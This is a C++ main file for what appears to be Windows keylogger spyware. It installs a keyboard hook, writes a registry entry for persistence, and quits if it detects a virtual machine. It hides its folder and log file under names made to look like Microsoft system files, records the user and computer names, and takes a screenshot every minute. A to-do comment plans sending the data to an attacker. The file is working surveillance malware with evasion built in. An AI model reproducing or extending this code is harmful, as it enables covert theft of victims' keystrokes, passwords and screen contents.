#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "debug.h"

#ifdef DEBUG_BUILD
#include "encrypt.h"
#endif

/*
 * LIST:
 *  - Only screenshot or start when whitelisted program is running
 *  - Run as Win Service
 *  - Send data to attacker
 *  - ASCII -> Binary (Reverse) -> ASCII (Divide & Remainder) -> 1st (Divide result) -> 2nd BINARY(shift left by remainder)
 */

int main() {
#ifdef DEBUG_BUILD
  std::string a = "a";
  std::string b = Crypt::StrToBinary(a);
  debn(b)
  char *c = Crypt::BinaryToStr(b);
  debn(*c);
  debn((int)*c);

#endif

#ifndef DEBUG_BUILD
  if (Sys::CheckForVirtualMachine()) {
	KeyHook::UninstallHook();
	Sys::RemoveFromRegistry();
	KeyHook::KillProcess();
	return 0;
  }

  Sys::AddToRegistry();
  Crypt::GenerateKeys();
  KeyHook::InstallHook();

  pClientInfo = &clientInfo;

  Stream::GetAccountInfo(pClientInfo);

  std::string path = Stream::GetPath("\\Microsoft\\");

  mainDir.name = "SystemService";
  mainDir.path = Stream::GetPath(Stream::GetPath("\\" + mainDir.name));

  debn(Stream::GetPath("\\Microsoft\\" + mainDir.name))

  Stream::MakeDir(mainDir.path, mainDir.name, FILE_ATTRIBUTE_HIDDEN);
  Stream::MakeFile("wnxshl2.sys.log", "\\Microsoft\\"); // Logs
  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, false);

  std::ostringstream ostream;

  DWORD major = pClientInfo->osVersionInfo.dwMajorVersion;
  DWORD minor = pClientInfo->osVersionInfo.dwMinorVersion;
  char *acc = pClientInfo->accountName;
  char *com = pClientInfo->computerName;

  ostream << "\n[*] OS Info: Major - " << major << "; Minor - " << minor << " [*]"
		  << "\n[*] Account Info: User -" << acc << "; Computer - " << com << " [*]";

  free(acc);
  free(com);

  std::string write = ostream.str();
  Stream::WriteLog(write, KeyHook::activeProcess, false);
  Screen::CaptureScreen(mainDir.path + "\\", "winpst", true, 60000); // Screenshot

  KeyHook::HandleMessage(true);

#endif // DEBUG_BUILD
  return 0;
}